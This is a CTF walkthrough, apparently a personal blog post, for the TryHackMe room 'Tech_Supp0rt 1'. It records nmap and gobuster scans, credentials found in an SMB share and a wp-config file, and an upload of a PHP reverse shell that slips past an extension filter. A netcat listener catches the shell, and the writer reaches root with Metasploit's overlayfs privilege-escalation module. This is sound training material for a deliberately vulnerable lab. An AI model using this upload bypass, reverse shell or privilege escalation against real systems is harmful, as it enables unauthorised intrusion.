---
title: Walkthrough - Tech_Supp0rt 1
published: true
---

RCE, File Upload, sudo, custom. Hacking into a scammer's under-development website to foil their plans.

[https://tryhackme.com/room/techsupp0rt1](https://tryhackme.com/room/techsupp0rt1)

* * *

## Notes

- ``sudo nmap -sC -sV -sT -O -p22,80,139,445 10.10.65.37``

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.2.0
OS details: Linux 3.2.0
Network Distance: 4 hops
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-08-07T20:57:51
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-08-08T02:27:51+05:30
|_clock-skew: mean: -1h50m00s, deviation: 3h10m30s, median: -1s
```

We find a few directories with gobuster ``/test``, which is the site the scammer points their victims to, and a ``/wordpress`` site.

- ``smbclient -L`` and checking ``websvr`` we find ``enter.txt`` with some creds

```
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

It is missing the wordpress creds though.

Checking ``/wp-login.php`` and the blog posts on the website we find a username ``support``

lets check out /subrion

- ``gobuster dir -u http://10.10.249.90/subrion -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php -t 100 --no-error -b 301,302,404``

- end up finding the panel @ ``http://techsupport.thm/subrion/panel.php`` but we have to get the magical formula for the password. I am assuming this is "cooked" with cyberchef

![0xskar](/assets/techsupp0rt1-01.png)

- now we have creds ``admin:Scam2021``
- nagivate to uploads and upload a revshell. since .htaccess disallowes certain file extensions we are using a pentestmoney php rev shell that has the ``.phar`` file extension.
- one uploaded visit ``http://techsupport.thm/subrion/uploads/shell.phar`` after setting up listener ``rlwrap nc -lvnp 6666``

- found some things running linpeas.sh

```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rwxr-xr-x 1 www-data www-data 2992 May 29  2021 /var/www/html/wordpress/wp-config.php                                                                                     
define( 'DB_NAME', 'wpdb' );
define( 'DB_USER', 'support' );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
define( 'DB_HOST', 'localhost' );
```

```
#   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/bpf_sign_extension_priv_esc                     Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
 4   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/glibc_realpath_priv_esc                         Yes                      The target appears to be vulnerable.
 6   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 7   exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.
 8   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 9   exploit/linux/local/sudo_baron_samedit                              Yes                      The target appears to be vulnerable. sudo 1.8.16 is a vulnerable build.
```


* * * 

## What is the root flag?

- ``linux/local/cve_2021_3493_overlayfs`` in msfconsole and cat root.txt

* * * 

